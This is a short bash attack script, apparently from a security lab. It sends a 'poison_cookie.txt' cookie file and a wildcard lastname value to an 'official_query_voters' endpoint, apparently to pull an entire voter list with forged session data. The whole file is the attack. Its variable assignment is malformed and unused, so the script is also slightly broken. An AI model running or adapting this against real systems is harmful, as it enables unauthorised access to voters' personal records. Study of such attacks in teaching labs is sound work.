#!/bin/bash

SERVER_LOC = $1

curl -b poison_cookie.txt -I http://$1/bvrs/official_query_voters?lastname=%%
